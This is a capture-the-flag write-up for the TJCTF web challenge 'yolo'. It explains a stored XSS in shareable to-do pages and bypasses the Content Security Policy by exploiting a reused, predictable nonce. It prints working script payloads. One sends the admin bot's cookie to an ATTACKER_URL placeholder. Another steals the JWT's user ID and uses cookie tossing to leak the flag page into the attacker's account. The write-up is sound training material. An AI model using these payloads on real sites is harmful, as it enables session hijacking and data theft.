# yolo

## Flag

tjctf{y0u_0n1y_1iv3_0nc3_5ab61b33}

## Solution

The web application contains a form with two fields "name" and "toDo" which can be submitted for creating a page.
The pages that can be created by the users can be shared with other by using links in the format `https://yolo.tjc.tf/do/userId`
and the user generated pages are also vulnerable to XSS, but there is a CSP.

The CSP of the web application uses a nonce-source:
```JavaScript
    req.locals.nonce = req.locals.nonce ?? '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d';
    req.locals.nonce = crypto.createHash('sha256').update(req.locals.nonce).digest('hex');
    res.header('Content-Security-Policy', `script-src 'nonce-${req.locals.nonce}'; default-src 'self'; style-src 'self' 'nonce-${req.locals.nonce}';`);
```

The "nonces" in the code above are reused in each session. For bypassing the CSP, we can now either calculate the correct "nonce" by using the code from above or
we can submit the form and open a link as the admin bot does and read the nonce from HTML source of that page.
We observe that `6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36` is the correct "nonce" for bypassing the CSP on the admin bot.

Now, we can exploit the XSS vulnerability for example with the following payload in the "toDo" input field:
```JavaScript
<script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">
window.location = "ATTACKER_URL?"+btoa(document.cookie);
</script>
```

We submit the link to the admin bot and obtain the base64 encoded value of `document.cookie`, we decode it and find the JWT.
Then, we use https://jwt.io/ to read the content of JWT and find the `userId`

```JSON
{
  "iat": VALUE,
  "nonce": "93af138c9d0fb8ad1c4ce6ea446bc0ab0f676ac7d823c00d4f2d6dbd42b645c7",
  "userId": "50698c58-a7f7-4869-8d82-9ef088e61ea4"
}
```

Now, we can navigate to `https://yolo.tjc.tf/do/50698c58-a7f7-4869-8d82-9ef088e61ea4` to obtain the flag.

Another possibility would be to use Cookie Tossing for letting the browser of the admin bot post the flag or with the following payload the value of `userId` to a page we can access:
```JavaScript
<script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">
async function getFlag() {
   const ATTACKER_COOKIE = "ATTACKER_COOKIE";
   const userId = JSON.parse(atob(document.cookie.split("=")[1].split(".")[1])).userId;
   console.log(document.cookie.split("=")[1].split(".")[1]);
   console.log(JSON.parse(atob(document.cookie.split("=")[1].split(".")[1])));
   let response = await fetch("/do/"+userId);
   let text = await response.text();
   document.cookie = `token=${ATTACKER_COOKIE};path=/`;
   await fetch("/", {method: "POST",
                     headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                     },
                     body: "name=a&toDo="+encodeURIComponent(text)});
}
getFlag();
</script>
```
